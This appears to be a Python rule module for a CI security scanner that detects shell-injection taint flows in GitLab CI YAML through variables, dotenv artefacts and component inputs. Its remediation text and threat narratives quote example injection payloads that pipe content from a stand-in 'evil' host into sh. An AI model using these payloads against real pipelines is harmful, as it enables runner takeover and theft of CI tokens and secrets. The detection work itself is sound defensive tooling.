"""Rules: env-mediated script-injection taint flows for GitLab CI.

Sibling of ``taintly/rules/github/taint.py`` for GitLab CI YAML.
Each rule is a thin wrapper around
:func:`taintly.gitlab_taint.analyze` that filters the returned
paths by :attr:`TaintPath.kind`.  Keeping the rules separate lets
reviewers ratchet on / silence specific propagation styles without
silencing the others.

Current roster:

* **TAINT-GL-001** — shallow ``variables:`` flow:
  ``variables: { LAUNDERED: $CI_TAINTED }`` followed by a ``script:``,
  ``before_script:``, or ``after_script:`` line that references
  ``$LAUNDERED``.
* **TAINT-GL-002** — multi-hop variable propagation: at least one
  ``B: $A`` indirection through a project-defined ``variables:`` entry
  before the script-line sink.
* **TAINT-GL-003** — ``dotenv`` artefact bridge across jobs: a writer
  job declares ``artifacts.reports.dotenv:`` and echoes
  ``NAME=value`` with attacker-controlled data into that file; a
  later job that ``needs:`` the writer then shell-expands ``$NAME``.
  This is the closest GitLab analog of the GitHub ``$GITHUB_ENV``
  bridge caught by TAINT-GH-003.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from taintly.gitlab_taint import TaintPath
from taintly.gitlab_taint import analyze as taint_analyze
from taintly.models import ContextPattern, Platform, Rule, Severity
from taintly.taint import _shell_quote_context_at

# Re-parsing commands that defeat double-quote protection. Mirror of
# the same constant in taintly/rules/github/taint.py — see
# TAINT-GH-001 audit (2026-04-27) for the rationale. Kept as a local
# copy here rather than imported because the GitHub TaintPattern
# adapter is rule-local too; future divergence (e.g. GitLab-specific
# eval-class commands) can stay in this file without ripple effects.
_REPARSING_CMD_RE = re.compile(
    r"\b(?:eval|sh\s+-c|bash\s+-c|zsh\s+-c|"
    r"python(?:3)?\s+-c|perl\s+-e|ruby\s+-e|node\s+-e)\b"
)


def _sink_is_safely_quoted(snippet: str, var_name: str) -> bool:
    """True if every shell reference to ``var_name`` in ``snippet`` is
    double-quoted AND the line contains no eval-class re-parsing
    command. Mirror of the GitHub-side helper. GitLab-specific note:
    server-side ``$VAR`` substitution at YAML-parse time is performed
    by the runner before bash sees the line, so the safety is the
    same as for $-shell expansion — only the unquoted form admits a
    direct injection primitive.
    """
    if _REPARSING_CMD_RE.search(snippet):
        return False
    found_any = False
    for m in re.finditer(rf"\$\{{?{re.escape(var_name)}\}}?\b", snippet):
        found_any = True
        if _shell_quote_context_at(snippet, m.start()) != "double":
            return False
    return found_any

# ---------------------------------------------------------------------------
# Pattern adapter
# ---------------------------------------------------------------------------


@dataclass
class TaintPattern:
    """Adapter exposing :func:`gitlab_taint.analyze` via the engine's
    pattern contract.  The engine calls ``.check(content, lines)`` and
    expects ``list[tuple[int, str]]``.

    ``kind_filter`` narrows the returned paths to a single propagation
    style (see :attr:`TaintPath.kind`).  Each rule in this module
    constructs a :class:`TaintPattern` with its own ``kind_filter`` so
    the same analyzer pass services every rule.

    ``sink_quote_filter`` (added 2026-04-27) partitions paths by
    whether the sink line quotes the variable safely. Mirror of the
    same parameter on the GitHub adapter — see TAINT-GH-001 audit
    notes. Modes:

      * ``"unsafe_only"``: keep paths where AT LEAST ONE reference is
        unquoted, OR the line contains an eval-class re-parsing
        command. The actual command-injection surface.
      * ``"safely_quoted_only"``: keep paths where EVERY reference is
        double-quoted AND no re-parser is present. Lint-grade.
      * ``None`` (default): no quoting filter.
    """

    description: str = "GitLab variables-mediated taint"
    exclude: list[str] = field(default_factory=list)
    kind_filter: str | None = None
    sink_quote_filter: str | None = None

    # CONTRACT: returns (line_num, snippet) where line_num is the
    # taint sink's source line, and snippet is the rendered provenance
    # chain — not literal source text.  Documented exception, see
    # taintly._pattern_contract.
    def check(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
        out: list[tuple[int, str]] = []
        for path in taint_analyze(content, lines):
            if self.kind_filter is not None and path.kind != self.kind_filter:
                continue
            if self.sink_quote_filter is not None:
                # Last hop's name is the variable referenced at the sink.
                # Skip paths whose hop name carries a dotted prefix
                # (e.g. dotenv "<producer>.<name>") — those reach the
                # sink via a server-side substitution where shell-
                # quoting at the sink line doesn't fully protect.
                var_name = path.hops[-1].name if path.hops else ""
                if var_name and "." not in var_name:
                    safely_quoted = _sink_is_safely_quoted(path.sink_snippet, var_name)
                    if self.sink_quote_filter == "unsafe_only" and safely_quoted:
                        continue
                    if self.sink_quote_filter == "safely_quoted_only" and not safely_quoted:
                        continue
            out.append((path.sink_line, _format_chain(path)))
        return out


def _format_chain(path: TaintPath) -> str:
    """Render a taint path as a one-line provenance chain.

    Example (shallow)::

        taint: $CI_COMMIT_TITLE -> variables.PR_TITLE -> echo "$PR_TITLE"

    Example (multi-hop)::

        taint: $CI_COMMIT_TITLE -> variables.A -> variables.B -> echo "$B"

    Example (dotenv bridge)::

        taint: $CI_MERGE_REQUEST_TITLE -> variables.RAW
               -> dotenv(producer).TITLE -> echo "$TITLE"

    The dotenv hop's ``name`` is already stored as
    ``"<producer_job>.<var_name>"`` by the analyzer, so we just prefix
    it with ``dotenv(`` and split the producer from the variable name
    for readability.
    """
    parts = [f"${path.source_var}"]
    for hop in path.hops:
        if hop.kind in ("var_static", "var_indirect"):
            parts.append(f"variables.{hop.name}")
        elif hop.kind == "dotenv":
            producer, _, name = hop.name.partition(".")
            parts.append(f"dotenv({producer}).{name}")
    parts.append(path.sink_snippet[:120])
    return "taint: " + " -> ".join(parts)


# ---------------------------------------------------------------------------
# TAINT-GL-001 — shallow variables flow
# ---------------------------------------------------------------------------


_TAINT_001_REMEDIATION = (
    "A GitLab pre-defined CI variable that an external contributor "
    "controls (commit title / message / branch name, MR title / "
    "description / source branch) is copied into a project-defined "
    "``variables:`` entry, and that variable is then expanded inside "
    "a ``script:``, ``before_script:``, or ``after_script:`` line.  "
    "The ``variables:`` indirection is NOT a mitigation — at runtime "
    "the runner's shell expands the value, so an attacker who injects "
    "shell metacharacters (e.g. ``$(curl evil | sh)``) into the "
    "commit message or MR title gets command execution with the "
    "runner's full token and protected variables.\n"
    "\n"
    "  # BAD — variables indirection still gets shell-expanded\n"
    "  variables:\n"
    "    PR_TITLE: $CI_MERGE_REQUEST_TITLE\n"
    "  job:\n"
    "    script:\n"
    '      - echo "$PR_TITLE"\n'
    "\n"
    "Pick one of these patterns:\n"
    "\n"
    "  # GOOD — pipe through stdin / a file so the value never reaches\n"
    "  # the shell as a substituted token.\n"
    "  variables:\n"
    "    PR_TITLE: $CI_MERGE_REQUEST_TITLE\n"
    "  job:\n"
    "    script:\n"
    "      - printenv PR_TITLE > /tmp/title\n"
    "      - some-tool --title-file /tmp/title\n"
    "\n"
    "  # GOOD — sanitize via parameter expansion before use.\n"
    "  job:\n"
    "    script:\n"
    "      - SAFE='${CI_MERGE_REQUEST_TITLE//[^a-zA-Z0-9._ -]/}'\n"
    '      - echo "$SAFE"\n'
    "\n"
    "  # GOOD — gate on the value in a ``rules:`` clause; GitLab\n"
    "  # evaluates those server-side, no shell involved.\n"
    "  job:\n"
    "    rules:\n"
    "      - if: '$CI_MERGE_REQUEST_TITLE =~ /^\\[release\\]/'\n"
    "    script:\n"
    "      - ./release.sh\n"
    "\n"
    "Note: GitLab's existing ``SEC4-GL-001`` catches the *direct* "
    "case where the predefined variable is referenced unquoted in a "
    "script line.  This rule closes the gap where the value is first "
    "laundered through a project ``variables:`` entry — even quoted "
    "use of the indirection variable still expands the attacker's "
    "string, so quoting alone is not a fix."
)


# ---------------------------------------------------------------------------
# Rules
# ---------------------------------------------------------------------------


RULES = [
    Rule(
        id="TAINT-GL-001",
        title=(
            "Attacker-controlled CI variable flows through a "
            "``variables:`` entry into a script (shallow taint)"
        ),
        severity=Severity.CRITICAL,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitLab pre-defined CI variable an external contributor "
            "can influence (``$CI_COMMIT_TITLE``, ``$CI_COMMIT_MESSAGE``, "
            "``$CI_COMMIT_BRANCH``, ``$CI_COMMIT_REF_NAME``, "
            "``$CI_COMMIT_AUTHOR``, ``$CI_MERGE_REQUEST_TITLE``, "
            "``$CI_MERGE_REQUEST_DESCRIPTION``, "
            "``$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME``, "
            "``$CI_MERGE_REQUEST_LABELS``, ...) is copied into a "
            "project-defined ``variables:`` entry — at top level or "
            "scoped to a single job — and that project variable is "
            "subsequently expanded inside a ``script:``, "
            "``before_script:``, or ``after_script:`` line.  "
            "``SEC4-GL-001``'s line-local regex flags only the direct "
            "reference; it cannot see the indirection through "
            "``variables:`` that many pipelines use, mistakenly "
            "believing it sanitises the value.  The runner expands "
            "the indirection at shell time, so an attacker who "
            "injects shell metacharacters into the source CI "
            "variable gets command execution with the runner's full "
            "token and every protected variable in scope."
        ),
        pattern=TaintPattern(
            kind_filter="shallow",
            # 2026-04-27 audit: only fire on actually-unsafe sinks
            # (unquoted reference OR eval-class re-parsing). Mirror
            # of the TAINT-GH-001 fix. Safely-quoted multi-hop / lint
            # cases are deliberately not tracked on GitLab — see
            # SCORECARDS notes for the rationale.
            sink_quote_filter="unsafe_only",
        ),
        remediation=_TAINT_001_REMEDIATION,
        reference="https://docs.gitlab.com/ci/variables/predefined_variables/",
        test_positive=[
            # Canonical: top-level variables: launders MR title, job
            # script: expands it UNQUOTED (post-2026-04-27 audit).
            (
                "variables:\n"
                "  PR_TITLE: $CI_MERGE_REQUEST_TITLE\n"
                "build:\n"
                "  script:\n"
                "    - echo $PR_TITLE\n"
            ),
            # Job-level variables override / extend; unquoted ref.
            (
                "build:\n"
                "  variables:\n"
                "    HEAD: $CI_COMMIT_REF_NAME\n"
                "  script:\n"
                "    - git checkout $HEAD\n"
            ),
            # eval re-parses the value — quoting doesn't help.
            (
                "variables:\n"
                "  MSG: $CI_COMMIT_MESSAGE\n"
                "test:\n"
                "  before_script:\n"
                '    - eval "$MSG"\n'
            ),
        ],
        test_negative=[
            # Safely double-quoted reference (post-audit). POSIX
            # parameter expansion does not re-tokenise the value's
            # contents inside double quotes, so injection at a
            # non-eval sink isn't possible. No lint companion on
            # GitLab — same scorecard rationale as TAINT-GH-002/003.
            (
                "variables:\n"
                "  PR_TITLE: $CI_MERGE_REQUEST_TITLE\n"
                "build:\n"
                "  script:\n"
                '    - echo "$PR_TITLE"\n'
            ),
            # Non-tainted source: $CI_COMMIT_SHA is just a hex digest,
            # no shell metachars possible.
            ('variables:\n  SHA: $CI_COMMIT_SHA\nbuild:\n  script:\n    - echo "$SHA"\n'),
            # Tainted variable declared but never referenced.
            ("variables:\n  MSG: $CI_COMMIT_MESSAGE\nbuild:\n  script:\n    - echo no-reference\n"),
            # Tainted variable used only in a ``rules:`` clause —
            # evaluated server-side, not by the shell.
            (
                "build:\n"
                "  variables:\n"
                "    PR_TITLE: $CI_MERGE_REQUEST_TITLE\n"
                "  rules:\n"
                "    - if: '$PR_TITLE != \"\"'\n"
                "  script:\n"
                "    - echo hello\n"
            ),
            # Direct unquoted reference is SEC4-GL-001's responsibility,
            # not this rule.  No project-variables indirection happens
            # here.
            ("build:\n  script:\n    - echo $CI_COMMIT_MESSAGE\n"),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An external contributor opens an MR whose title is "
            '``"; curl evil.sh | sh ; #``.  The pipeline copies the '
            "title into ``PR_TITLE`` via the ``variables:`` block — "
            "which the author believed was a mitigation — and a later "
            '``script:`` step evaluates ``echo "$PR_TITLE"``, '
            "executing the injected command with the runner's full "
            "GitLab token, protected CI/CD variables, and SSH keys."
        ),
        incidents=[],
    ),
    Rule(
        id="TAINT-GL-002",
        title=(
            "Attacker-controlled CI variable reaches script: through "
            "multi-hop ``variables:`` propagation (deep taint)"
        ),
        severity=Severity.CRITICAL,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A chain of ``variables:`` assignments launders an "
            "attacker-controlled GitLab CI variable through one or "
            "more ``B: $A`` indirections before the value lands in a "
            "``script:``, ``before_script:``, or ``after_script:`` "
            "line.  TAINT-GL-001 only catches the direct "
            "``variables: { X: $CI_TAINTED }`` -> ``script: $X`` "
            "flow; this rule catches ``A -> B -> ... -> script: "
            "$FINAL``.  The added indirection hides the flow from "
            "reviewers and from the line-local SEC4-GL-001 regex, "
            "but at shell time the final variable still expands to "
            "whatever the attacker wrote into the source CI "
            "variable — so the shell sees, and executes, the "
            "injected payload.  The finding snippet contains the "
            "full hop chain so the reviewer can see exactly which "
            "``variables:`` assignments carried the taint."
        ),
        pattern=TaintPattern(
            kind_filter="multi_hop",
            # 2026-04-27 audit: same shell-quoting fix as TAINT-GL-001.
            # No lint companion (matches the GitHub TAINT-GH-002
            # decision; multi-hop chains are inherently complex
            # signal so a hygiene-only finding for the safely-quoted
            # case dilutes the alarm).
            sink_quote_filter="unsafe_only",
        ),
        remediation=(
            "This pipeline launders an attacker-controlled value "
            "through one or more ``variables:`` indirections before "
            "feeding it to a ``script:`` line.  Every hop makes the "
            "flow harder to spot, but the final shell expansion "
            "behaves exactly like the direct case — whatever the "
            "attacker put in the source CI variable is evaluated by "
            "bash at the sink.\n"
            "\n"
            "  # BAD — chain of variables ending in a shell expansion\n"
            "  variables:\n"
            "    RAW: $CI_MERGE_REQUEST_TITLE\n"
            "    TITLE: $RAW\n"
            "  job:\n"
            "    script:\n"
            '      - echo "$TITLE"\n'
            "\n"
            "The safe pattern is the same as for TAINT-GL-001: never "
            "let the tainted string be evaluated as a shell "
            "fragment.  Pick one:\n"
            "\n"
            "  # GOOD — read via a file, shell never sees the value\n"
            "  variables:\n"
            "    TITLE: $CI_MERGE_REQUEST_TITLE\n"
            "  job:\n"
            "    script:\n"
            "      - printenv TITLE > /tmp/title\n"
            "      - some-tool --title-file /tmp/title\n"
            "\n"
            "  # GOOD — sanitize via parameter expansion before use\n"
            "  job:\n"
            "    script:\n"
            "      - SAFE='${CI_MERGE_REQUEST_TITLE//[^a-zA-Z0-9._ -]/}'\n"
            '      - echo "$SAFE"\n'
            "\n"
            "  # GOOD — gate in a ``rules: - if:`` (server-side, no shell)\n"
            "  job:\n"
            "    rules:\n"
            "      - if: '$CI_MERGE_REQUEST_TITLE =~ /^\\[release\\]/'\n"
            "    script:\n"
            "      - ./release.sh\n"
            "\n"
            "If the multi-hop chain was for readability only, collapse "
            "it: a single ``variables:`` assignment from the source "
            "CI variable is no less safe and is much easier for "
            "reviewers and future rule authors to audit.  The chain "
            "itself does not add any defence."
        ),
        reference="https://docs.gitlab.com/ci/variables/predefined_variables/",
        test_positive=[
            # Canonical 2-hop chain — UNQUOTED at the sink (post-2026-
            # 04-27 audit).
            (
                "variables:\n"
                "  RAW: $CI_MERGE_REQUEST_TITLE\n"
                "  TITLE: $RAW\n"
                "build:\n"
                "  script:\n"
                "    - echo $TITLE\n"
            ),
            # 3-hop across top-level + job-level scopes; unquoted ${C}.
            (
                "variables:\n"
                "  A: $CI_COMMIT_MESSAGE\n"
                "  B: $A\n"
                "build:\n"
                "  variables:\n"
                "    C: $B\n"
                "  script:\n"
                "    - echo ${C}\n"
            ),
            # Brace-form ${VAR} reference at unquoted git checkout.
            (
                "variables:\n"
                "  RAW: $CI_COMMIT_REF_NAME\n"
                "  REF: ${RAW}\n"
                "deploy:\n"
                "  script:\n"
                "    - git checkout ${REF}\n"
            ),
        ],
        test_negative=[
            # Safely-quoted multi-hop sink — dropped under the 2026-
            # 04-27 audit (matches TAINT-GH-002's behavior).
            (
                "variables:\n"
                "  RAW: $CI_MERGE_REQUEST_TITLE\n"
                "  TITLE: $RAW\n"
                "build:\n"
                "  script:\n"
                '    - echo "$TITLE"\n'
            ),
            # Shallow flow is TAINT-GL-001's responsibility, not this rule.
            ('variables:\n  T: $CI_MERGE_REQUEST_TITLE\nbuild:\n  script:\n    - echo "$T"\n'),
            # Chain exists but final var is never referenced in a script.
            ("variables:\n  A: $CI_COMMIT_TITLE\n  B: $A\nbuild:\n  script:\n    - echo hello\n"),
            # Non-tainted root: $CI_COMMIT_SHA is hex-only, so the chain
            # is clean end to end.
            ('variables:\n  A: $CI_COMMIT_SHA\n  B: $A\nbuild:\n  script:\n    - echo "$B"\n'),
            # Partial expression ``B: $A-suffix`` — conservative resolver
            # does not propagate through a user-inserted fragment.
            (
                "variables:\n"
                "  A: $CI_COMMIT_TITLE\n"
                "  B: $A-suffix\n"
                "build:\n"
                "  script:\n"
                '    - echo "$B"\n'
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "A pipeline author writes ``TITLE: $RAW`` believing the "
            "extra level of indirection sanitises the MR title.  It "
            "does not — the chain resolves at run time to the raw "
            "attacker string, which bash then expands when the "
            "``script:`` step references ``$TITLE``.  An attacker "
            'crafts an MR title of ``"; curl evil | sh ; #`` and the '
            "pipeline executes the injected command with the "
            "runner's GitLab token and every protected variable."
        ),
        incidents=[],
    ),
    Rule(
        id="TAINT-GL-003",
        title=(
            "Attacker-controlled CI variable persisted through a "
            "``reports.dotenv`` artefact reaches a downstream job's "
            "script (deep taint)"
        ),
        severity=Severity.CRITICAL,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A writer job launders an attacker-controlled GitLab CI "
            "variable (``$CI_COMMIT_TITLE``, "
            "``$CI_MERGE_REQUEST_TITLE``, ``$CI_COMMIT_REF_NAME``, "
            '...) into a line of the form ``echo "NAME=..." > '
            "build.env`` and declares ``build.env`` as the job's "
            "``artifacts.reports.dotenv:`` artefact.  GitLab's runner "
            "parses the artefact and sets each line as a real "
            "environment variable in every consumer job that "
            "``needs:`` the writer (unless that ``needs:`` entry "
            "explicitly opts out with ``artifacts: false``).  When "
            "the consumer then shell-expands ``$NAME`` inside a "
            "``script:``, ``before_script:``, or ``after_script:`` "
            "line, the attacker's bytes execute in bash with the "
            "runner's full GitLab token and every protected "
            "variable.  This is the cross-job analogue of the "
            "GitHub ``$GITHUB_ENV`` bridge caught by TAINT-GH-003 "
            "and is GitLab's only built-in mechanism for passing "
            "dynamic variables between jobs, so it's worth treating "
            "every tainted ``reports.dotenv`` write as a critical "
            "finding even when the consumer reference looks benign."
        ),
        pattern=TaintPattern(kind_filter="dotenv"),
        remediation=(
            "A writer job is persisting an attacker-controlled value "
            "into its ``reports.dotenv`` artefact, and a job that "
            "``needs:`` the writer then expands the resulting "
            "environment variable in a shell context.  The dotenv "
            "bridge is not a mitigation: the runner copies the raw "
            "bytes across the ``needs:`` boundary unchanged, and the "
            "consumer's shell will run whatever metacharacters the "
            "attacker embedded in the source CI variable.\n"
            "\n"
            "  # BAD — bridges PR title into downstream shell\n"
            "  producer:\n"
            "    variables:\n"
            "      RAW: $CI_MERGE_REQUEST_TITLE\n"
            "    script:\n"
            '      - echo "TITLE=$RAW" > build.env\n'
            "    artifacts:\n"
            "      reports:\n"
            "        dotenv: build.env\n"
            "  consumer:\n"
            "    needs: [producer]\n"
            "    script:\n"
            '      - echo "title is $TITLE"\n'
            "\n"
            "Pick one of these fixes:\n"
            "\n"
            "  # GOOD — pass the value through a non-dotenv artefact\n"
            "  # (plain file) and read it via ``printenv`` / ``cat``\n"
            "  # in the consumer, so the shell never sees the value\n"
            "  # as a substituted string.\n"
            "  producer:\n"
            "    variables:\n"
            "      TITLE: $CI_MERGE_REQUEST_TITLE\n"
            "    script:\n"
            "      - printenv TITLE > title.txt\n"
            "    artifacts:\n"
            "      paths: [title.txt]\n"
            "  consumer:\n"
            "    needs: [producer]\n"
            "    script:\n"
            "      - some-tool --title-file title.txt\n"
            "\n"
            "  # GOOD — keep the dotenv artefact but opt the consumer\n"
            "  # out of inheriting it, then read the value through the\n"
            "  # consumer's own env: block after sanitising it.\n"
            "  consumer:\n"
            "    needs:\n"
            "      - job: producer\n"
            "        artifacts: false\n"
            "\n"
            "  # GOOD — don't bridge attacker data through dotenv at\n"
            "  # all; bind the value in the consumer's ``variables:``\n"
            "  # block and consume it via parameter expansion.\n"
            "  consumer:\n"
            "    variables:\n"
            "      TITLE: $CI_MERGE_REQUEST_TITLE\n"
            "    script:\n"
            "      - SAFE='${TITLE//[^a-zA-Z0-9._ -]/}'\n"
            '      - echo "$SAFE"\n'
            "\n"
            "If the dotenv bridge is only there to thread a value "
            "through the pipeline, consider redeclaring the variable "
            "at top-level or in the consumer's ``variables:`` instead "
            "— the GitLab runner will set it directly, no artefact "
            "required, and the flow is auditable in one place."
        ),
        reference="https://docs.gitlab.com/ci/yaml/artifacts_reports/#artifactsreportsdotenv",
        test_positive=[
            # Canonical bridge: MR title -> env.RAW -> dotenv TITLE
            # -> consumer echo.
            (
                "producer:\n"
                "  variables:\n"
                "    RAW: $CI_MERGE_REQUEST_TITLE\n"
                "  script:\n"
                '    - echo "TITLE=$RAW" > build.env\n'
                "  artifacts:\n"
                "    reports:\n"
                "      dotenv: build.env\n"
                "consumer:\n"
                "  needs: [producer]\n"
                "  script:\n"
                '    - echo "title is $TITLE"\n'
            ),
            # Direct tainted CI variable inlined in the dotenv write.
            (
                "producer:\n"
                "  script:\n"
                '    - echo "REF=$CI_COMMIT_REF_NAME" > build.env\n'
                "  artifacts:\n"
                "    reports:\n"
                "      dotenv: build.env\n"
                "consumer:\n"
                "  needs: [producer]\n"
                "  script:\n"
                '    - git checkout "$REF"\n'
            ),
            # ``needs:`` block-list form with ``job:`` mapping; default
            # ``artifacts:`` is true so the bridge is active.
            (
                "producer:\n"
                "  variables:\n"
                "    RAW: $CI_COMMIT_MESSAGE\n"
                "  script:\n"
                '    - echo "MSG=$RAW" > env.env\n'
                "  artifacts:\n"
                "    reports:\n"
                "      dotenv: env.env\n"
                "consumer:\n"
                "  needs:\n"
                "    - job: producer\n"
                "  script:\n"
                '    - echo "$MSG"\n'
            ),
        ],
        test_negative=[
            # Non-tainted value ($CI_COMMIT_SHA) -- hex digits only.
            (
                "producer:\n"
                "  script:\n"
                '    - echo "SHA=$CI_COMMIT_SHA" > build.env\n'
                "  artifacts:\n"
                "    reports:\n"
                "      dotenv: build.env\n"
                "consumer:\n"
                "  needs: [producer]\n"
                "  script:\n"
                '    - echo "$SHA"\n'
            ),
            # Consumer opts out of artefact inheritance via
            # ``artifacts: false`` -- no propagation.
            (
                "producer:\n"
                "  variables:\n"
                "    RAW: $CI_MERGE_REQUEST_TITLE\n"
                "  script:\n"
                '    - echo "TITLE=$RAW" > build.env\n'
                "  artifacts:\n"
                "    reports:\n"
                "      dotenv: build.env\n"
                "consumer:\n"
                "  needs:\n"
                "    - job: producer\n"
                "      artifacts: false\n"
                "  script:\n"
                '    - echo "$TITLE"\n'
            ),
            # Consumer does not ``needs:`` the producer at all, so the
            # runner never inherits the dotenv.
            (
                "producer:\n"
                "  variables:\n"
                "    RAW: $CI_MERGE_REQUEST_TITLE\n"
                "  script:\n"
                '    - echo "TITLE=$RAW" > build.env\n'
                "  artifacts:\n"
                "    reports:\n"
                "      dotenv: build.env\n"
                "consumer:\n"
                "  script:\n"
                '    - echo "$TITLE"\n'
            ),
            # Tainted write, but no consumer references $TITLE
            # anywhere.  Dead bridge; no sink.
            (
                "producer:\n"
                "  variables:\n"
                "    RAW: $CI_MERGE_REQUEST_TITLE\n"
                "  script:\n"
                '    - echo "TITLE=$RAW" > build.env\n'
                "  artifacts:\n"
                "    reports:\n"
                "      dotenv: build.env\n"
                "consumer:\n"
                "  needs: [producer]\n"
                "  script:\n"
                "    - echo hello\n"
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An external contributor opens an MR whose title is "
            '``"; curl evil.sh | sh ; #``.  The producer job copies '
            "the title into ``$RAW`` via ``variables:``, then writes "
            '``"TITLE=$RAW"`` into its ``reports.dotenv`` artefact.  '
            "GitLab's runner parses the artefact and sets "
            "``$TITLE`` in the environment of every job that "
            "``needs:`` the producer.  The consumer's ``script:`` "
            'runs ``echo "title is $TITLE"`` and bash executes the '
            "injected command substitution with the runner's full "
            "GitLab token, protected CI/CD variables, and SSH keys."
        ),
        incidents=[],
    ),
    # =========================================================================
    # TAINT-GL-004 — cross-component input reference (GitLab CI Components,
    #                16.11+)
    # =========================================================================
    #
    # GitLab CI Components declare typed inputs at the top of the template
    # file:
    #
    # ::
    #
    #     spec:
    #       inputs:
    #         version:
    #           {type}: string
    #     ---
    #     job:
    #       script:
    #         - echo $[[ inputs.version ]]
    #
    # Callers include the component with:
    #
    #     include:
    #       - component: $CI_SERVER_FQDN/group/component@v1
    #         inputs:
    #           version: $CI_MERGE_REQUEST_TITLE       # attacker-controlled!
    #
    # Same shared-responsibility shape as TAINT-GH-006.  The component
    # author cannot know what callers pass, so a reviewer has to audit
    # the caller tree to confirm no fork / MR trigger forwards a
    # GitLab attacker context (``CI_MERGE_REQUEST_*``, ``GITLAB_USER_*``,
    # ``CI_COMMIT_BRANCH`` under MR triggers) into a component input.
    Rule(
        id="TAINT-GL-004",
        title="CI Component input reference (caller responsible for safety)",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitLab CI Component declares typed inputs via "
            "``spec.inputs:`` and references them as ``$[[ inputs.X "
            "]]`` somewhere in its template.  The component author "
            "cannot know what callers pass: a caller that includes "
            "this component from an MR-triggered pipeline and "
            "forwards ``CI_MERGE_REQUEST_TITLE`` / ``CI_COMMIT_BRANCH`` "
            "/ ``GITLAB_USER_*`` into the input substitutes attacker-"
            "controlled bytes into the component's jobs — with the "
            "component's runner access and any protected / masked "
            "CI/CD variables bound to the pipeline.  Review every "
            "caller of this component to confirm inputs are sourced "
            "from trusted contexts only."
        ),
        pattern=ContextPattern(
            # Reference to a component input in the GitLab-specific
            # $[[ inputs.NAME ]] substitution form. Input names allow
            # hyphens by convention (``fail-on``, ``min-severity``).
            anchor=r"\$\[\[\s*inputs\.[A-Za-z_][\w-]*\s*\]\]",
            # File is a CI Component — has ``spec:`` header with a
            # nested ``inputs:`` block. The (?ms) flags let ``.`` match
            # newlines and ``^`` match at line starts for the
            # header-then-child layout GitLab requires.
            requires=r"(?ms)^spec\s*:\s*(?:#.*)?\n\s+inputs\s*:",
            exclude=[
                # Schema-definition lines — an input referenced inside
                # its own declaration block isn't a sink.  ``options:``
                # is GitLab-specific (the GitHub analog has no options:).
                r"^\s*(?:description|default|type|required|options)\s*:",
                # GitLab's job-level conditionals live in ``rules:`` +
                # ``if:`` — evaluated by the runner, not by bash.
                r"^\s*if\s*:",
                # Structural / inert fields the runner validates or
                # never substitutes into a shell:
                #   timeout       — duration string ("1 hour"), engine-parsed
                #   when          — enum (on_success/on_failure/manual/always)
                #   interruptible — boolean
                # Keep ``image:``, ``stage:``, ``services:``,
                # ``tags:`` IN — those have real risks (attacker-
                # controlled container image, runner-tag hijack).
                r"^\s*(?:timeout|when|interruptible)\s*:",
                r"^\s*#",
            ],
            scope="file",
        ),
        remediation=(
            "Do one of:\n"
            "\n"
            "1. Document the input contract in a template-level\n"
            "   comment and audit every caller.  Callers that include\n"
            "   the component from MR-triggered pipelines must NOT\n"
            "   forward ``CI_MERGE_REQUEST_TITLE``,\n"
            "   ``CI_MERGE_REQUEST_SOURCE_BRANCH_NAME``,\n"
            "   ``CI_COMMIT_BRANCH`` (under MR triggers), or\n"
            "   ``GITLAB_USER_*`` fields without sanitisation.\n"
            "\n"
            "2. Copy the input into a ``variables:`` entry and\n"
            "   reference it as ``$VAR`` in ``script:`` — marginally\n"
            "   safer, still requires caller-side validation:\n"
            "     variables:\n"
            "       TITLE: $[[ inputs.title ]]\n"
            "     script:\n"
            '       - echo "$TITLE"\n'
            "\n"
            "3. Type-constrain the input via ``options:`` where the\n"
            "   value is an enum — prevents arbitrary text at\n"
            "   component-include time."
        ),
        reference="https://docs.gitlab.com/ci/components/",
        test_positive=[
            # Canonical component with an input used in a script: line.
            "spec:\n  inputs:\n    version:\n      type: string\n"
            "---\n"
            "build:\n  script:\n    - echo $[[ inputs.version ]]\n",
            # Input used in image: (attacker can influence container).
            "spec:\n  inputs:\n    img:\n      type: string\n"
            "---\n"
            "build:\n  image: $[[ inputs.img ]]\n  script:\n    - echo hi\n",
        ],
        test_negative=[
            # Not a component — ``spec.inputs`` is absent; ``$[[ inputs.X ]]``
            # in this file would be a syntax error at pipeline parse time,
            # and the rule doesn't fire either way.
            "build:\n  script:\n    - echo hi\n",
            # Component, but the input is only referenced inside its
            # own ``default:`` declaration — schema, not a sink.
            "spec:\n  inputs:\n    ver:\n      type: string\n"
            "      default: $[[ inputs.fallback ]]\n"
            "---\n"
            "build:\n  script:\n    - echo hi\n",
            # Component, input referenced only in a ``timeout:`` field.
            # Engine parses it as a duration string.
            "spec:\n  inputs:\n    t:\n      type: string\n"
            "---\n"
            "build:\n  timeout: $[[ inputs.t ]]\n"
            "  script:\n    - echo hi\n",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An external contributor opens an MR against a "
            "repository that includes a CI Component from an MR-"
            "triggered pipeline.  The caller forwards "
            "``CI_MERGE_REQUEST_TITLE`` (or any similar attacker-"
            "controlled field) as an input to the component.  The "
            "substituted value lands in a ``script:`` line with the "
            "component's runner access and any protected / masked "
            "CI/CD variables.  Same injection shape as TAINT-GL-001 "
            "but the taint source crosses a component boundary and "
            "so no single-file rule catches it."
        ),
        incidents=[],
    ),
]
